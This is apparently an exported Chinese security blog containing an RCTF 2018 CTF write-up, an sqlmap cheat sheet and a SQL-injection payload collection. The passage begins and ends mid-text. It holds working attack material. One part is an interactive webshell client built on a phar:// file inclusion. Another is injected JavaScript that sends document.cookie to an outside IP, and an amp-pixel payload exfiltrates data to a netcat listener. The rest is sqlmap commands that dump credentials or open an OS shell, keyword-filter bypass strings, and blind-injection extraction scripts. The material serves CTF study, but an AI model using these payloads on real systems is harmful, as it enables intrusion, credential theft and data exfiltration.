/init.php?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get(&#39;open_basedir&#39;);\n</code></pre><pre><code>HTTP/1.1 200 OK\nDate: Tue, 22 May 2018 07:26:20 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nContent-Length: 0\nConnection: close\nContent-Type: text/html; charset=UTF-8\n</code></pre><p>getflag:</p>\n<pre><code>GET /71aabdeb3d708872c6e00e066ae48b2669834df7/index.php?cmd=eval(end(getallheaders())); HTTP/1.1\nHost: .sandbox.r-cursive.ml:1337\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\ncookie: echo ini_get(&#39;open_basedir&#39;);var_dump(file_get_contents(&quot;/var/www/sandbox/init.php&quot;));\n</code></pre><pre><code>HTTP/1.1 200 OK\nDate: Tue, 22 May 2018 06:51:10 GMT\nServer: Apache/2.4.10 (Debian)\nX-Powered-By: PHP/5.6.36\nVary: Accept-Encoding\nContent-Length: 186\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n/var/www/sandbox/:/tmp/string(148) &quot;&lt;?php\n    ini_set(&quot;open_basedir&quot;, $_SERVER[&#39;DOCUMENT_ROOT&#39;].&quot;/:/tmp/&quot;);\n    // flag: RCTF{apache_mod_vhost_alias_should_be_configured_correctly}\n?&gt;\n&quot;\n</code></pre><h2 id=\"Backdoor\"><a href=\"#Backdoor\" class=\"headerlink\" title=\"Backdoor\"></a>Backdoor</h2><p><img src=\"/images/rctf/1526992722365.png\" alt=\"1526992722365\"></p>\n<p>根据contrab.sh,我们可以得到两个链接：</p>\n<blockquote>\n<p><a href=\"http://backdoor.2018.teamrois.cn/post.php?action=upload\" target=\"_blank\" rel=\"noopener\">http://backdoor.2018.teamrois.cn/post.php?action=upload</a></p>\n<p><a href=\"http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers\" target=\"_blank\" rel=\"noopener\">http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers</a></p>\n</blockquote>\n<p>打开首页，查看源码，得到aaencode之后的js代码:</p>\n<p>解密网址:<code>https://tool.zcmzcm.org/aadecode</code></p>\n<pre><code>document.loginform.onsubmit = function (e) { \n    e.preventDefault()\n    document.getElementById(&#39;wp-submit&#39;).disabled = &#39;disabled&#39;\n    setTimeout(function () {\n        document.getElementById(&#39;wp-submit&#39;).removeAttribute(&#39;disabled&#39;)\n        alert(&#39;Login failed&#39;)\n        &quot;What? Need hint?&quot;\n        &quot;index.php is a hint!&quot;\n    }, 3000)\n}\n</code></pre><p>说明，不用登录。</p>\n<p>查看post.php，发现可能存在LFI。</p>\n<p>index.php,没啥用</p>\n<blockquote>\n<p><a href=\"http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index\" target=\"_blank\" rel=\"noopener\">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index</a></p>\n</blockquote>\n<p>post.php</p>\n<pre><code>&lt;?php\nerror_reporting(0);\ninclude $_GET[&#39;action&#39;] . &#39;.php&#39;;\n</code></pre><p>uploa.php</p>\n<pre><code>&lt;?php\nif (!isset($_FILES[&#39;file&#39;])) exit;\n$file = $_FILES[&#39;file&#39;];\n$zip = new ZipArchive();\nif (true !== $zip-&gt;open($file[&#39;tmp_name&#39;])) {\n    echo &#39;No a valid zip&#39;;\n    exit;\n}\nif (false === $zip-&gt;getFromName(&#39;tmp/random.txt&#39;)) {\n    echo &#39;No file&#39;;\n    exit;\n}\n\n$dest = &#39;uploads/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . hash(&#39;sha256&#39;, file_get_contents($file[&#39;tmp_name&#39;])) . &#39;.zip&#39;;\nmove_uploaded_file($file[&#39;tmp_name&#39;], $dest);\necho &#39;Saved into &#39; . $dest;\n</code></pre><p>利用zip://或者phar://包含。</p>\n<pre><code class=\"python\">import requests\n\ns = &quot;Saved into &quot;\npost_url = &quot;http://backdoor.2018.teamrois.cn/post.php?action=upload&quot;\nzip_file = open(&quot;tmp.zip&quot;,&quot;rb&quot;)\nupload_file = {&#39;file&#39;:zip_file}\nr = requests.post(post_url,files=upload_file)\ndest = r.text[len(s):]\nshell_url = &quot;http://backdoor.2018.teamrois.cn/post.php?action=phar://&quot;+ dest + &quot;/evil&quot;\nprint(&quot;[*] shell url: &quot; + shell_url)\nwhile  True:\n    command = input(&quot;command: &quot;)\n    payload = {&#39;chybeta&#39;: &#39;system(&quot;%s&quot;);&#39; % command}\n    r = requests.get(shell_url,params=payload)\n    print(r.text)\n</code></pre>\n<h2 id=\"r-blog\"><a href=\"#r-blog\" class=\"headerlink\" title=\"r-blog\"></a>r-blog</h2><p>title:        “&lt;&gt;1”</p>\n<p>content: “&lt;&gt;1”</p>\n<p>结果：</p>\n<pre><code>\n&lt;!doctype html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset=&quot;utf-8&quot;&gt;\n    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;\n    &lt;link rel=&quot;stylesheet&quot; href=&quot;/assets/css/bootstrap.min.css&quot;&gt;\n    &lt;link rel=&quot;stylesheet&quot; href=&quot;/assets/css/style.css&quot;&gt;\n    &lt;link href=&quot;https://fonts.googleapis.com/css?family=Titillium+Web&quot; rel=&quot;stylesheet&quot;&gt;\n    &lt;title&gt;rBlog 2018&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div class=&quot;container mt-5&quot;&gt;\n    &lt;div class=&quot;card&quot;&gt;\n                &lt;div class=&quot;card-body&quot;&gt;\n            &lt;h2 class=&quot;card-title&quot;&gt;&lt;&gt;1&lt;/h2&gt;\n            &lt;p class=&quot;card-text&quot;&gt;&amp;lt;&amp;gt;2&lt;/p&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n&lt;script nonce=&quot;090c154a21d0fdf5809aff4586fe1eed&quot; src=&quot;/assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>title没有过滤，content过滤。</p>\n<p>csp如下:</p>\n<pre><code>X-Frame-Options: DENY\nContent-Security-Policy: default-src &#39;none&#39;; script-src &#39;nonce-3ae08923a2654e27a3734f7876a5abe0&#39;; frame-src https://www.google.com/recaptcha/; style-src &#39;self&#39; &#39;unsafe-inline&#39; fonts.googleapis.com; font-src fonts.gstatic.com; img-src &#39;self&#39;\n</code></pre><p>我们看到jquery.min.js是相对地址，并且base-uri没有在csp中指定。</p>\n<p>所以payload如下:</p>\n<p>title: <code>&lt;base href =&quot;http://【my_server】/&quot;&gt;</code></p>\n<p>content: 随意</p>\n<p>在字节的vps上添加jquery.min.js，网址:           <code>http://[my_server]/assets/js/jquery.min.js</code></p>\n<p>jquery.min.js的内容：</p>\n<pre><code>window.location.href=&quot;http://123.207.90.143?&quot;+document.cookie;\n</code></pre><p>最终结果:</p>\n<pre><code>115.159.200.107 - - [22/May/2018:21:39:02 +0800] &quot;GET /?flag=RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012};%20hint_for_rBlog_Rev.2=http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d HTTP/1.1&quot; 200 15 &quot;http://rblog.2018.teamrois.cn/&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/66.0.3359.181 Safari/537.36&quot;\n</code></pre><h2 id=\"amp\"><a href=\"#amp\" class=\"headerlink\" title=\"amp\"></a>amp</h2><p>payload:</p>\n<blockquote>\n<p><a href=\"http://amp.2018.teamrois.cn?name=\" target=\"_blank\" rel=\"noopener\">http://amp.2018.teamrois.cn?name=</a><amp-pixel src=\"https://123.207.90.143:1234/pixel?clientId=CLIENT_ID(FLAG)\"></amp-pixel></p>\n</blockquote>\n<pre><code>[root@VM_89_224_redhat ~]# nc -lvv 1234\nNcat: Version 6.40 ( http://nmap.org/ncat )\nNcat: Listening on :::1234\nNcat: Listening on 0.0.0.0:1234\nNcat: Connection from 106.120.206.166.\nNcat: Connection from 106.120.206.166:64053.\n\u0016\u0003\u0001\u0002\u0001\u0001�\u0003\u0003�Y���8۲Y�=����6���km����\n                                 ��A It+z���^�vY�$���,�\u00183�&#39;�����*K�Zp&quot;jj\u0013\u0001\u0013\u0002\u0013\u0003�+�/�,�0̨̩�\u0013�\u0014��/5\n\u0014\u0012\u0004\u0004\u0004\u0001\u0006\u0006\u0001\u0002\u0001\u0001\u0012\u0010\n              \u0002hhttp/1.1uP\n                          \u0002\u00013+)jj\u0001\u001d �ZaV&gt;WB�~\u0013���|�Z��4KM�������Et~-\u0002\u0001\u0001+\n\n��\u0017\u0003\u0003\u0003\u0002\u0003\u0001\n</code></pre><p>writeup:</p>\n<blockquote>\n<p> <a href=\"https://github.com/zsxsoft/my-rctf-2018/tree/master/amp\" target=\"_blank\" rel=\"noopener\">https://github.com/zsxsoft/my-rctf-2018/tree/master/amp</a></p>\n</blockquote>\n<p>注意，我这里是乱码的原因是，我直接监听1234端口，并不支持ssl。</p>"},{"title":"sqlmap使用","date":"2018-06-08T01:45:39.000Z","_content":"\n# sqlmap使用手册\n\nsqlmap一共5个级别，级别越高，检测越全面\n\n1. 检测\n\n   默认使用level1，检测全部数据库类型\n\n   >  sqlmap -u “http://www.vuln.cn/post.php?id=1”\n\n2. 只检测mysql\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3\n\n3. 检测cookie(（只有level达到2才会检测cookie）)\n\n   >  sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11” –level 2\n\n4. post注入\n\n   request.txt: 首先需要抓包，然后将数据包保存到requests.txt\n\n   > sqlmap -r “c:\\tools\\request.txt” -p “username” –dbms mysql    \n   >\n   > 指定username参数\n\n   或者:\n\n   > python sqlmap.py -u \"http://www.target.com/vuln.php\" --data=\"id=1\" -f --dbs\n\n5. 查询有哪些数据库\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –-dbms mysql -–level 3 –-dbs\n\n6. 查询有哪些表(以test数据库为例)\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –-dbms mysql –-level 3 -D test -–tables\n\n7. 查询字段(以test数据库下的admin表为例)\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –-dbms mysql –-level 3 -D test -T admin –-columns\n\n8. 查询数据(以test数据库下的admin表为例)\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  -–dbms mysql –-level 3 -D test -T admin -C “username,password” –-dump\n\n9. 使用shell命令\n\n   > sqlmap -r “c:\\tools\\request.txt” -p id –-dbms mysql –-os-shell\n\n10. 使用tamper\n\n    >  sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3 --tamper unmagicquotes --dbs --hex\n\n11. 保存进度\n\n    > sqlmap -u “http://url/news?id=1“ –-dbs-o “sqlmap.log” 保存进度\n    >\n    > sqlmap -u “http://url/news?id=1“ -–dbs-o “sqlmap.log” –resume 恢复已保存进度\n\n    ","source":"_posts/sqlmap使用.md","raw":"---\ntitle: sqlmap使用\ndate: 2018-06-08 09:45:39\ntags: web安全\n---\n\n# sqlmap使用手册\n\nsqlmap一共5个级别，级别越高，检测越全面\n\n1. 检测\n\n   默认使用level1，检测全部数据库类型\n\n   >  sqlmap -u “http://www.vuln.cn/post.php?id=1”\n\n2. 只检测mysql\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3\n\n3. 检测cookie(（只有level达到2才会检测cookie）)\n\n   >  sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11” –level 2\n\n4. post注入\n\n   request.txt: 首先需要抓包，然后将数据包保存到requests.txt\n\n   > sqlmap -r “c:\\tools\\request.txt” -p “username” –dbms mysql    \n   >\n   > 指定username参数\n\n   或者:\n\n   > python sqlmap.py -u \"http://www.target.com/vuln.php\" --data=\"id=1\" -f --dbs\n\n5. 查询有哪些数据库\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –-dbms mysql -–level 3 –-dbs\n\n6. 查询有哪些表(以test数据库为例)\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –-dbms mysql –-level 3 -D test -–tables\n\n7. 查询字段(以test数据库下的admin表为例)\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –-dbms mysql –-level 3 -D test -T admin –-columns\n\n8. 查询数据(以test数据库下的admin表为例)\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  -–dbms mysql –-level 3 -D test -T admin -C “username,password” –-dump\n\n9. 使用shell命令\n\n   > sqlmap -r “c:\\tools\\request.txt” -p id –-dbms mysql –-os-shell\n\n10. 使用tamper\n\n    >  sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3 --tamper unmagicquotes --dbs --hex\n\n11. 保存进度\n\n    > sqlmap -u “http://url/news?id=1“ –-dbs-o “sqlmap.log” 保存进度\n    >\n    > sqlmap -u “http://url/news?id=1“ -–dbs-o “sqlmap.log” –resume 恢复已保存进度\n\n    ","slug":"sqlmap使用","published":1,"updated":"2018-06-08T06:29:19.978Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jpu000zly4jjjofyue5","content":"<h1 id=\"sqlmap使用手册\"><a href=\"#sqlmap使用手册\" class=\"headerlink\" title=\"sqlmap使用手册\"></a>sqlmap使用手册</h1><p>sqlmap一共5个级别，级别越高，检测越全面</p>\n<ol>\n<li><p>检测</p>\n<p>默认使用level1，检测全部数据库类型</p>\n<blockquote>\n<p> sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a></p>\n</blockquote>\n</li>\n<li><p>只检测mysql</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3</p>\n</blockquote>\n</li>\n<li><p>检测cookie(（只有level达到2才会检测cookie）)</p>\n<blockquote>\n<p> sqlmap -u “<a href=\"http://www.baidu.com/shownews.asp”\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com/shownews.asp”</a> –cookie “id=11” –level 2</p>\n</blockquote>\n</li>\n<li><p>post注入</p>\n<p>request.txt: 首先需要抓包，然后将数据包保存到requests.txt</p>\n<blockquote>\n<p>sqlmap -r “c:\\tools\\request.txt” -p “username” –dbms mysql    </p>\n<p>指定username参数</p>\n</blockquote>\n<p>或者:</p>\n<blockquote>\n<p>python sqlmap.py -u “<a href=\"http://www.target.com/vuln.php\" target=\"_blank\" rel=\"noopener\">http://www.target.com/vuln.php</a>“ –data=”id=1” -f –dbs</p>\n</blockquote>\n</li>\n<li><p>查询有哪些数据库</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –-dbms mysql -–level 3 –-dbs</p>\n</blockquote>\n</li>\n<li><p>查询有哪些表(以test数据库为例)</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –-dbms mysql –-level 3 -D test -–tables</p>\n</blockquote>\n</li>\n<li><p>查询字段(以test数据库下的admin表为例)</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –-dbms mysql –-level 3 -D test -T admin –-columns</p>\n</blockquote>\n</li>\n<li><p>查询数据(以test数据库下的admin表为例)</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  -–dbms mysql –-level 3 -D test -T admin -C “username,password” –-dump</p>\n</blockquote>\n</li>\n<li><p>使用shell命令</p>\n<blockquote>\n<p>sqlmap -r “c:\\tools\\request.txt” -p id –-dbms mysql –-os-shell</p>\n</blockquote>\n</li>\n<li><p>使用tamper</p>\n<blockquote>\n<p> sqlmap.py -u <a href=\"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3\" target=\"_blank\" rel=\"noopener\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</a> –tamper unmagicquotes –dbs –hex</p>\n</blockquote>\n</li>\n<li><p>保存进度</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://url/news?id=1“\" target=\"_blank\" rel=\"noopener\">http://url/news?id=1“</a> –-dbs-o “sqlmap.log” 保存进度</p>\n<p>sqlmap -u “<a href=\"http://url/news?id=1“\" target=\"_blank\" rel=\"noopener\">http://url/news?id=1“</a> -–dbs-o “sqlmap.log” –resume 恢复已保存进度</p>\n</blockquote>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqlmap使用手册\"><a href=\"#sqlmap使用手册\" class=\"headerlink\" title=\"sqlmap使用手册\"></a>sqlmap使用手册</h1><p>sqlmap一共5个级别，级别越高，检测越全面</p>\n<ol>\n<li><p>检测</p>\n<p>默认使用level1，检测全部数据库类型</p>\n<blockquote>\n<p> sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a></p>\n</blockquote>\n</li>\n<li><p>只检测mysql</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3</p>\n</blockquote>\n</li>\n<li><p>检测cookie(（只有level达到2才会检测cookie）)</p>\n<blockquote>\n<p> sqlmap -u “<a href=\"http://www.baidu.com/shownews.asp”\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com/shownews.asp”</a> –cookie “id=11” –level 2</p>\n</blockquote>\n</li>\n<li><p>post注入</p>\n<p>request.txt: 首先需要抓包，然后将数据包保存到requests.txt</p>\n<blockquote>\n<p>sqlmap -r “c:\\tools\\request.txt” -p “username” –dbms mysql    </p>\n<p>指定username参数</p>\n</blockquote>\n<p>或者:</p>\n<blockquote>\n<p>python sqlmap.py -u “<a href=\"http://www.target.com/vuln.php\" target=\"_blank\" rel=\"noopener\">http://www.target.com/vuln.php</a>“ –data=”id=1” -f –dbs</p>\n</blockquote>\n</li>\n<li><p>查询有哪些数据库</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –-dbms mysql -–level 3 –-dbs</p>\n</blockquote>\n</li>\n<li><p>查询有哪些表(以test数据库为例)</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –-dbms mysql –-level 3 -D test -–tables</p>\n</blockquote>\n</li>\n<li><p>查询字段(以test数据库下的admin表为例)</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –-dbms mysql –-level 3 -D test -T admin –-columns</p>\n</blockquote>\n</li>\n<li><p>查询数据(以test数据库下的admin表为例)</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  -–dbms mysql –-level 3 -D test -T admin -C “username,password” –-dump</p>\n</blockquote>\n</li>\n<li><p>使用shell命令</p>\n<blockquote>\n<p>sqlmap -r “c:\\tools\\request.txt” -p id –-dbms mysql –-os-shell</p>\n</blockquote>\n</li>\n<li><p>使用tamper</p>\n<blockquote>\n<p> sqlmap.py -u <a href=\"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3\" target=\"_blank\" rel=\"noopener\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</a> –tamper unmagicquotes –dbs –hex</p>\n</blockquote>\n</li>\n<li><p>保存进度</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://url/news?id=1“\" target=\"_blank\" rel=\"noopener\">http://url/news?id=1“</a> –-dbs-o “sqlmap.log” 保存进度</p>\n<p>sqlmap -u “<a href=\"http://url/news?id=1“\" target=\"_blank\" rel=\"noopener\">http://url/news?id=1“</a> -–dbs-o “sqlmap.log” –resume 恢复已保存进度</p>\n</blockquote>\n</li>\n</ol>\n"},{"title":"sql注入大全","date":"2018-03-21T01:26:16.000Z","_content":"- 表名\n\n  ```mysql\n  select group_concat(distinct table_name) from information_schema.tables where table_schema=database()\n  ```\n\n\n- 列名\n\n  ```mysql\n  select group_concat(distinct column_name) from information_schema.columns where table_name=[16进制|`table_name`]\n  ```\n\n\n- 数据库\n\n  ```mysql\n  select group_concat(schema_name) from information_schema.schemata\n  ```\n\n- 表内容\n\n  ```mysql\n  select 1,concat(user, 0x2c, password) from [table_name]\n  ```\n\n  ​\n```\n优先级 运算符\n(最高)  !\n    -（负号）,~（按位取反）\n    ^（按位异或）\n    *,/(DIV),%(MOD)\n    +,-\n    >>,<<\n    &\n    |\n    =(比较运算),<=>,<,<=,>,>=,!=,<>,IN,IS NULL,LIKE,REGEXP\n   BETWEEN AND,CASE,WHEN,THEN,ELSE\n   NOT\n   &&,AND\n   XOR\n   ||,OR\n(最低)    =(赋值运算),:=\n```\n\n# union select 不允许同时出现\n过滤正则表达式如下:\n<code>\t\nunion[\\s\\xA0]+select\n</code><br/>\n可以使用union all select绕过\n\n# select过滤\nse%00lect绕过\n\n# -- 注释\n--后边不允许添加任何空白字符\n过滤正则表达式如下:\n--[\\s\\xA0]\n还可以使用%1a\n--%1a绕过\n\n# where后边跟着sleep函数\n`\nselect * from table_name where sleep(2) or 1 = 2;\n`\n\n如果1=2，则会等待（2*该表中的记录数）秒，没有数据返回\n如果1=1，则会立即返回所有数据\n\n@`'` 相当于 NULL\n\nselect group_concat(ip)'' from client_ip;\n\n# DNSlog盲注\nDNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like '%secure%';查看load_file()可以读取的磁盘。\n\n1、当secure_file_priv为空，就可以读取磁盘的目录。\n\n2、当secure_file_priv为G:\\，就可以读取G盘的文件。\n\n3、当secure_file_priv为null，load_file就不能加载文件。\n\n\nsleep 不能填数字，可以使用pi()替代\n\n各种payload:\n```\nselect * from antisqli where `id`='\\' and `pw`=md5(' union select 1,2,3--')\n```\n\n```\n644400 union select 'z1',flag,'z3','z4' from flag order by password desc#\n```\n\n关键词union,select,from被过滤，可以考虑%00绕过\n\n```\n//过滤sql\n$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');\nforeach ($array as $value)\n{\n\tif (substr_count($id, $value) > 0)\n\t{\n\t\texit('包含敏感关键字！'.$value);\n\t}\n}\n\n//xss过滤\n$id = strip_tags($id);\n\n$query = \"SELECT * FROM temp WHERE id={$id} LIMIT 1\";\npayload:\nhttp://103.238.227.13:10087/?id=2 unio%00n se%00lect hash,2 fro%00m sql3.key#\n由于strip_tags 将<>替换为空，所以可以使用<>绕过：\nhttp://103.238.227.13:10087/?id=2 unio<>n se<>lect hash,2 fro%00m sql3.key#\n```\n\n某些情况下SQL关键词被过滤掉并且被替换成空格。因此我们用“%0b”来绕过。\nid=1+uni%0bon+se%0blect+1,2,3--\n\n# Mysql大小写不敏感，绕过检测\n\n# heavy query       \n\n[链接](http://www.360zhijia.com/anquan/369098.html)\n\n## 笛卡尔积运算\n\n> select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C);\n\n```python\nimport requests\n\nurl = \"http://52.80.179.198:8080/article.php?id=1' and %s and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)%%23\"\ndata = \"\"\nfor i in range(1,1000):\n    for j in range(33,127):\n        #payload = \"(ascii(substr((database()),%s,1))=%s)\"%(i,j) #post\n        #payload = \"(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)\" % (i, j) #article,flags\n        #payload = \"(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)\" % (i, j) #flag\n        payload = \"(ascii(substr((select flag from flags limit 1),%s,1))=%s)\" % (i, j)\n        payload_url = url%(payload)\n        try:\n            r = requests.get(url=payload_url,timeout=8)\n        except:\n            data +=chr(j)\n            print data\n            break\n```\n\n\n\n##  Get_lock\n\nget_lock是mysql的锁机制\n\n* get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。\n* 当调用release_lock来释放上面的锁或者客户端断线，上面的锁才释放，其他的客户端才能进来\n\n打开两个cmd\n\ncmd1:\n\n```\nmysql> select get_lock('skysec.top',1);\n+--------------------------+\n| get_lock('skysec.top',1) |\n+--------------------------+\n|                        1 |\n+--------------------------+\n1 row in set (0.00 sec)\n```\n\ncmd2:\n\n```\nmysql> select get_lock('skysec.top',5);\n+--------------------------+\n| get_lock('skysec.top',5) |\n+--------------------------+\n|                        0 |\n+--------------------------+\n1 row in set (5.00 sec)\n```\n\ncmd1:\n\n```\nmysql> select get_lock('skysec.top',2);\n+--------------------------+\n| get_lock('skysec.top',2) |\n+--------------------------+\n|                        0 |\n+--------------------------+\n1 row in set (2.00 sec)\n```\n\n关闭cmd1,cmd2执行：\n\n```\nmysql> select get_lock('skysec.top',5);\n+--------------------------+\n| get_lock('skysec.top',5) |\n+--------------------------+\n|                        1 |\n+--------------------------+\n1 row in set (0.00 sec)\n```\n\ncmd1关闭之后，锁自动释放，方案不是最佳，原因，该方法需要前提，长连接一般在php版本系列中，我们建立与Mysql的连接使用的是`mysql_connect`。\n\n```\nmysql_connect() 脚本一结束，到服务器的连接就被关闭\nmysql_pconnect() 打开一个到 MySQL 服务器的持久连接\n```\n\n官方描述：\n\n```\nmysql_pconnect() 和 mysql_connect() 非常相似，但有两个主要区别。\n首先，当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的（持久）连接，如果找到，则返回此连接标识而不打开新连接。\n其次，当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用（mysql_close() 不会关闭由 mysql_pconnect() 建立的连接）。\n简单来说，即\nmysql_connect()使用后立刻就会断开\n而\nmysql_pconnect()会保持连接，并不会立刻断开\n```\n\n所以:\n\n我们的时间盲注必须基于我们请求加锁的资源已经被其他客户端加锁过了 而mysql_connect()一结束，就会立刻关闭连接 这就意味着，我们刚刚对资源`skysec.top`加完锁就立刻断开了 而get_lock一旦断开连接，就会立刻释放资源 那么也就破坏了我们的前提：我们请求加锁的key已经被其他客户端加锁过了 所以如果使用了`mysql_connect()`，那么get_lock的方法将不适用 而`mysql_pconnect()`建立的却是长连接，我们的锁可以在一段有效的时间中一直加持在特定资源上 从而使我们可以满足大前提，而导致新的time injection手法 当然这里还有一个注意点 即第一次加锁后，需要等待1~2分钟，再访问的时候服务器就会判断你为客户B，而非之前加锁的客户A 此时即可触发get_lock 同样我们也本地测试一下，还是之前的cmd1和cmd2\n\n cmd1:\n\n```\nmysql> select * from content where id = 1 and get_lock('skysec.top',1);\n+----+-------------------------------------+\n| id | content                             |\n+----+-------------------------------------+\n|  1 | I think you may need sql injection! |\n+----+-------------------------------------+\n1 row in set (0.00 sec)\n```\n\ncmd2:\n\n```\nmysql> select * from content where id =1 and 1 and get_lock('skysec.top',5);\nEmpty set (5.00 sec)\n\nmysql> select * from content where id =1 and 0 and get_lock('skysec.top',5);\nEmpty set (0.00 sec)\n```\n\n脚本如下:\n\n```python\n# -*- coding: utf-8 -*-\nimport requests\nimport time\nurl1 = \"http://52.80.179.198:8080/article.php?id=1' and get_lock('skysec.top',1)%23\"\nr = requests.get(url=url1)\ntime.sleep(90)\n# 加锁后变换身份\nurl2 = \"http://52.80.179.198:8080/article.php?id=1' and %s and get_lock('skysec.top',5)%%23\"\ndata = \"\"\nfor i in range(1,1000):\n    print i\n    for j in range(33,127):\n        #payload = \"(ascii(substr((database()),%s,1))=%s)\"%(i,j) #post\n        payload = \"(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)\" % (i, j) #article,flags\n        #payload = \"(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)\" % (i, j) #flag\n        #payload = \"(ascii(substr((select flag from flags limit 1),%s,1))=%s)\" % (i, j)\n        payload_url = url2%(payload)\n        